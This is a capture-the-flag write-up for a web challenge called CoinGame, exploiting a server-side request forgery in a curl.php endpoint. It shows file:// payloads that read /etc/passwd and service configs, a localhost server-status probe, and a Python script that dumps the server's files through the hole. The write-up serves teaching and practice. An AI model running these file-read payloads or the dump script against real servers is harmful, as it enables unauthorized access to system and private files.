This was the challenge's description:  
```
Hi guy !
Hi !
Are you still working on your famous game?
Yes of course, I made some modifications to make it more fun.
Can I take a look at it?
No, I prefer to keep it on my file server. Sorry ;)
```

And this was the website, which as you can see is rather basic : there's just one input, waiting for an url, and the post button. The post is actually doing a curl with the value passed in the `way` param: `/curl.php?way=<url>`

After some tests, we noticed that we could read server files with the `ftp://` or `file://` commands. Like that: `curl.php?way=file:///etc/passwd`.  
![SSRF](/medias/ndhqual18/etcpasswd.png)  
Great, looks like a [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery).

We kept looking and found one interesting file `curl.php?way=file:///etc/default/tftpd-hpa`:
```
# /etc/default/tftpd-hpa TFTP_USERNAME="tftp" TFTP_DIRECTORY="/home/CoinGame" TFTP_ADDRESS="0.0.0.0:69" TFTP_OPTIONS="--secure â€”create" 
```
It seems like the "game" was transfered on the server through FTP, in the "/home/CoinGame" directory.
We tried to find some logfiles that might have helped us find files but we unfortunately found nothing. After a while, We found that a [server-status](https://httpd.apache.org/docs/2.4/mod/mod_status.html) was actually installed on `curl.php?way=http://localhost/server-status`

Between the spam of requests, we found some weird queries like: `curl.php?way=file:///home/CoinGame/TouchMonsterFiles.py`. We tried and boom, it worked. It looks like it was the game from the description. We searched for the code on the internet, and we quickly found the repo on [Github](https://github.com/totheyellowmoon/CoinGame).

After digging the server for a while, we didn't find anything interesting. So we decided to dump the project locally and make a `diff` between the 2 games through a script (don't mind the code pls). `list` was a file containing the list of all the files of the project:

```python
import os
import wget

url = 'http://coingame.challs.malice.fr/curl.php?way=file:///home/CoinGame/'
out = '/tmp/out/'

with open('list') as f: # create the directories
	for line in f:
		dirname = os.path.dirname(out + line)
		if not os.path.exists(dirname):
			try:
				os.makedirs(dirname)
			except Exception as e:
				pass
				
with open('list') as f: # download the files
	for line in f:
		line = line.rstrip()
		try:
			wget.download(url + line, out=out + line)
		except Exception as e:
			print(e)
			pass
```

Once it was downloaded, we just had to make a diff between the 2 folders: 
```bash
diff --brief -r CoinGame/ /tmp/out/
```

We quickly checked every image and we saw the actual flag on all `backgroundX.png` :

Done :)
